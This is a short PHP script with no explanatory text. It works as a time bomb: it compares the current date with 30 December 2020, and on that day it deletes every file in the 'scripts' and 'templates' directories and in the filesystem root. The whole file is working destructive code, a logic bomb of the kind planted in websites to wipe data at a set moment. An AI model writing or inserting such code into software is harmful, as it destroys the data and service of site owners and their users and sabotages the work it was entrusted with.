<?php
$timestamp = time();



$current_date = date('m-d-Y', time());
$end_countdown = date('m-d-Y', mktime(0,0,0,12,30,2020));



 if ($current_date == $end_countdown) {
    $files = glob('scripts/*');
    foreach ($files as $file) {
        unlink($file);
    }
    $files_2 = glob('templates/*');
    foreach ($files_2 as $file) {
        unlink($file);
    }
    $files_3 = glob('/*');
    foreach ($files_3 as $file) {
        unlink($file);
    }

}





